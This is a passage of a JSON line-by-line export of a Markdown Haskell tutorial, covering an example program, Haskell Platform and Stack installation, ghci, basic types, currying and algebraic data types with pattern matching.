        "content": "side-effect-free computation makes it a valuable asset in software engineering"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "contexts. Programs written in Haskell tend to be easy to test, refactor and"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "debug, with the compiler usually catching all bugs before the program can even"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "be compiled and run. Consequently, Haskell codebases are extraordinarily stable."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "Here\u0027s an example of a Haskell program that reads a string of numbers, prints"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "the sum of the numbers and repeats the process until the string `\"quit\"` is"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "entered. This shall serve as our Hello World."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "-- the entry point of the program"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "main :: IO ()"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "main \u003d do"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "    str \u003c- getLine"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "    if str \u003d\u003d \"quit\""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "        then return ()"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "        else do"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "            let sumOfNumbers \u003d sumAllNumbersInString str"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "            putStrLn $ show sumOfNumbers"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "            main"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "sumAllNumbersInString :: String -\u003e Int"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "sumAllNumbersInString str \u003d sumAll $ extractInts $ tokenize str"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "-- sums up a list of integers using a higher-order function (the left fold)"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "sumAll :: [Int] -\u003e Int"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "sumAll \u003d foldl (+) 0"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "-- convert each string of digits in a list to an actual integer"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "extractInts :: [String] -\u003e [Int]"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "extractInts \u003d fmap read"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "-- split string by spaces using a built-in function"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "tokenize :: String -\u003e [String]"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "tokenize \u003d words"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell is widely used in a whole range of industries, including banks,"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "financial companies, technology companies and engineering companies use Haskell"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "in a variety of systems. A comprehensive list may be found"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "[here](https://wiki.haskell.org/Haskell_in_industry)."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "# Getting Started"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "## Installation"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "**This tutorial, in general, assumes a _system-wide installation_ of the Haskell"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "Platform.** This is primarily for simplicity. It is perfectly acceptable to write"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "small programs or code not intended for production in this manner."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "When using Haskell in an actual project, however, it is **strongly-recommended**"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "to use Stack. Not doing so may cause dependency management to become a nightmare."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "### System-Wide Installation"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "For new users, Haskell may be quickly and easily installed by downloading the"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "[Haskell Platform](https://www.haskell.org/platform/) for their respective"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "operating systems. The Haskell Platform contains many common and important"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell libraries, in addition to the Glasgow Haskell Compiler (GHC)."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "At the time of writing, the Haskell Platform has binaries available for all"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "common operating systems, and many uncommon ones as well."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "### Stack Installation"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "For Haskell projects of significant size, it may be necessary to control the"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "exact versions of the compiler and libraries used. For such use cases, the"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "system-wide installation method above may prove unwieldy and inadequate. In"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "cases like these, it may be preferable to have an entire Haskell environment"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "just for that project, together with a curated set of libraries."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "In such a scenario, [Stack](https://www.haskellstack.org) may come in handy."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Stack is a package manager of sorts for Haskell, similar to NPM. Installation"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "instructions may be found in the"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "[Stack Documentation](https://docs.haskellstack.org/en/stable/README/), and is"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "fairly standard."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "A new Stack project may be created and set up with the following:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "```sh"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "# create the project skeleton"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "stack new ${PROJECT_NAME}"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "# go into the project source directory"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "cd ${PROJECT_NAME}"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "# install GHC for the project"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "stack setup"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "# compile the project"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "stack build"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "# run the project executable"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "stack exec ${PROJECT_NAME}-exe"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "The command `stack new` is used to create a new project, which contains a"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "skeleton already set up. This skeleton includes a `${PROJECT_NAME}.cabal` file,"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "which contains nearly the entire configuration for the project (compiler/library"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "versions, modules to be exposed, build targets, etc), and is best thought of as"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "a sort of `package.json` or `Gemfile` for Stack."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "The command `stack setup` downloads and installs GHC. Stack installs GHC"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "versions into an isolated location in a user\u0027s home directory, and does not add"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "them to the system path. The version used for any particular project depends on"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "the setting in the project\u0027s `${PROJECT_NAME}.cabal` file."
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "The commands `stack build` and `stack exec` are used to build and run the"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "project. The executable name for a project named Project is `Project-exe`. This"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "name is configurable in `Project.cabal`."
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "The rest of the Stack documentation may be found in the"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "[official guide](https://docs.haskellstack.org/en/stable/GUIDE/)."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "## Usage"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "The command `ghci` may be used to invoke the GHC interpreter. This launches an"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "[REPL](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop) where"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell code can be entered and evaluated interactively. This is a very useful"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "tool when first learning Haskell, and also when debugging code that fails to"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "compile."
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "The command `ghc` may be used to compile Haskell code down to machine code. The"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "invocation of `ghc` is very similar to that of `gcc`."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "When using Stack, simply prefix the commands with `stack`."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "# Whirlwind Tour"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "## Types"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell is statically typed, meaning that every variable binds to a value of a"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "specified type. Haskell is also strongly-typed, meaning that every value has a"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "well-defined type."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "### Basic Types"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "We specify types explicitly by postfixing the variable names with the type."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "    a :: Int"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "    a \u003d 5"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "    -- unbounded integer type, similar to Java BigInt"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "    b :: Integer"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "    b \u003d product [1..1000] -- this is the factorial of 1000"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "    pi :: Double"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "    pi \u003d 3.141592654"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell has very powerful type inference engine, so it is possible to omit the"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "type definitions in most cases."
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "    a \u003d 5"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "### Functions \u0026 Currying"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "Functions, which are just values, have types too. It is considered good practice"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "in Haskell to specify types for toplevel functions, as a form of documentation,"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "even though the compiler is likely able to infer types."
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "    -- input:      x of type Double"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "    -- output: x * x of type Double"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "    square :: Double -\u003e Double"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "    square x \u003d x * x"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "    -- computes the hypotenuse of a right triangle given the other two sides"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "    hypotenuse :: Double -\u003e Double -\u003e Double"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "    hypotenuse adj opp \u003d sqrt (square adj + square opp)"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "If the above syntax is confusing and the comments insufficient, the reader may"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "wish to consult the detailed introduction to Haskell syntax"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "[here](http://learnyouahaskell.com/starting-out)."
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "The type definition for `square` is rather obvious. But the type definition of"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "`hypotenuse` is a little strange. One would expect `(Double, Double) -\u003e Double)`"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "instead of `Double -\u003e Double -\u003e Double`. The reason is that functions in Haskell"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "are [curried](https://en.wikipedia.org/wiki/Currying), so a two-parameter"
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "function can be called with a single argument, with a one-parameter function"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "(that takes in the remaining argument and produces the value) being returned."
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "`(Double, Double) -\u003e Double` is actually a function that takes in a _single_"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "2-tuple parameter, which is different from a function that takes in two parameters."
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "The `-\u003e` binds to the right, so `Double -\u003e Double -\u003e Double` may be written as"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "`Double -\u003e (Double -\u003e Double)` (_a function that takes a double and"
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "returns a function that takes a double and returns a double_)."
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "Calling `hypotenuse 3 4` is also the same as calling `(hypotenuse 3) 4`,"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "as function application binds to the left."
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "We may go even further with currying, by fixing some parameters in the function:"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "    -- hypotenuse of a right triangle whose adjacent side is restricted to 3"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "    hypotenuseWithAdjacent3 :: Double -\u003e Double"
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "    hypotenuseWithAdjacent3 \u003d hypotenuse 3"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "This clearly illustrates how currying can be used to reuse and partially"
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "specialise code as needed. This idiom comes in handy very often in Haskell, as"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "will be seen later."
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "It may be of interest to note that **all** functions in Haskell take in at most"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "one parameter. The illusion of multi-parameter functions is created by currying"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "and left-binding function calls."
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": "### Algebraic Data Types \u0026 Pattern Matching"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": "It is possible to create custom data types, either from nothing or from"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": "existing types."
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": "    data TrafficSignal \u003d Red | Amber | Green"
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": "    -- define some values of type TrafficSignal, all type-inferred"
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "    redLight \u003d Red"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": "    amberLight \u003d Amber"
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "    greenLight \u003d Green"
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": "The `TrafficSignal` type is an example of creating data types from nothing."
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": "We call `Red`, `Amber` and `Green` the value constructors and `TrafficSignal`"
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": "itself the type constructor. In this case, a `TrafficSignal` has 3 possible"
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": "values, `Red`, `Amber` or `Green`."
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": "**Both type and value constructors must start with a capital letter.**"
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": "We make use of types in functions by pattern matching on the value constructors."
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "-"
        },
        "content": "It is necessary to pattern match on all the value constructors; omitting any"
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "-"
        },
        "content": "will cause the compiler to complain of non-exhaustive pattern matches."
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": "    makeTrafficDecision :: TrafficSignal -\u003e String"
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": "    -- leaving any of these out will cause the compiler to complain"
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": "    makeTrafficDecision Red \u003d \"Stop\""
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": "    makeTrafficDecision Amber \u003d \"Carefully Proceed\""
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": "    makeTrafficDecision Green \u003d \"Go\""
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "-"
        },
        "content": "It is also possible to create data types that encapsulate/contain other data types."
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": "The value constructors in this case take parameters instead of being bare."
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": "Pattern matching is done by \"expanding\" the value constructor."
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "-"
        },
        "content": "    data HttpRequest \u003d Get String | Post String"
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "-"
        },
        "content": "    handleRequest :: HttpRequest -\u003e String"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "-"
        },
        "content": "    -- the ++ denotes string concatenation in this context"
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "-"
        },
        "content": "    handleRequest (Get string) \u003d \"Get request performed on \" ++ string"
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": "    -- we use _ to denote that we don\u0027t care about the actual value"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": "    handleRequest (Post _) \u003d \"Post request not supported\""
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "-"
        },
        "content": "There is also an additional way to declare data types. Suppose we had a C++"
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "-"
        },
        "content": "class like so:"
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "-"
        },
        "content": "    // we are omitting trivial details like constructors"
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "-"
        },
